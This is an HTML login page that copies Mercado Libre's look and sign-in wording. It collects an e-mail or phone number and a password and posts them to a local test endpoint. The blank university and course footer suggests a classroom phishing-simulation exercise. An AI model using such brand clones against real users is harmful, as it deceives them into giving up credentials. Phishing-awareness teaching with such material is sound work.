<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="static/img/meli2.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa tu e-mail o teléfono para iniciar sesión</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fff;
            font-family: "Arial", sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Barra amarilla superior */
        .header-bar {
            background-color: #FFE600;
            height: 90px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding: 0 50px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
        }

        .logo-placeholder {
            width: 140px;
            height: 50px;
            background-color: #fff;
            border: 2px dashed #ccc;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #777;
            font-size: 0.85rem;
            margin-right: 20px;
        }

        .header-bar h1 {
            font-size: 1.8rem;
            font-weight: 700;
            color: #333;
            margin: 0;
        }

        /* Contenedor principal */
        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            height: calc(80vh - 140px);
            padding: 40px 20%;
        }

        /* Sección izquierda */
        .info-section {
            flex: 1;
            padding-right: 60px;
        }

        .info-section h2 {
            font-size: 2.2rem;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }

        .info-section p {
            font-size: 1.1rem;
            color: #555;
        }

        /* Cuadro del formulario */
        .login-box {
            flex: 1;
            max-width: 460px;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 70px 40px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.06);
            background-color: #fff;
        }

        .form-label {
            font-size: 0.95rem;
        }

        .form-control {
            height: 48px;
            border-radius: 6px;
            font-size: 1rem;
        }

        .btn-primary {
            background-color: #3483fa;
            border: none;
            width: 100%;
            font-weight: 600;
            height: 48px;
            border-radius: 6px;
            font-size: 1rem;
        }

        .btn-primary:hover {
            background-color: #2968c8;
        }

        .link {
            display: block;
            text-align: center;
            color: #3483fa;
            text-decoration: none;
            font-size: 0.95rem;
            margin-top: 14px;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #999;
            margin: 25px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }

        .divider:not(:empty)::before {
            margin-right: .75em;
        }

        .divider:not(:empty)::after {
            margin-left: .75em;
        }

        .google-btn {
            border: 1px solid #ddd;
            background-color: #fff;
            border-radius: 6px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            color: #555;
            font-weight: 500;
            text-decoration: none;
            font-size: 1rem;
        }

        .google-btn img {
            height: 22px;
            margin-right: 8px;
        }

        footer {
            background-color: #f2f2f2;
            padding: 20px 30px;
            font-size: 0.9rem;
            color: #555;
            display: flex;
            justify-content: space-between;
            position: fixed;
            bottom: 0;
            width: 90%;
        }

        @media (max-width: 992px) {
            .main-container {
                flex-direction: column;
                text-align: center;
                padding: 40px 20px;
            }
            .info-section {
                padding-right: 0;
                margin-bottom: 40px;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header-bar">
        <img src="/static/img/meli3.png" alt="Logo">
    
    </div>

    <!-- Cuerpo principal -->
    <div class="main-container">
        <div class="info-section">
            <h1>Ingresa tu e-mail o teléfono</h1>
            <p>para iniciar sesión en Login testeo</p>
        </div>

        <div class="login-box">
            <form id="loginForm" method="POST" action="/test-login">
                <div class="mb-3">
                    <label for="email" class="form-label">E-mail o teléfono</label>
                    <input type="text" id="email" name="email" class="form-control" placeholder="Ingresa tu correo o teléfono" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Contraseña</label>
                    <input type="password" id="password" name="password" class="form-control" placeholder="Ingresa tu contraseña" required>
                </div>
                <button type="submit" class="btn btn-primary">Continuar</button>
            </form>

            <a href="https://www.youtube.com" target="_blank" class="link">Crear cuenta</a>

            <div class="divider">o</div>

            <a href="https://www.google.com" target="_blank" class="google-btn">
                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google icon">
                Iniciar sesión con Google
            </a>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div>Universidad: __________________________</div>
        <div>Curso / Materia: ______________________</div>
    </footer>

</body>
</html>
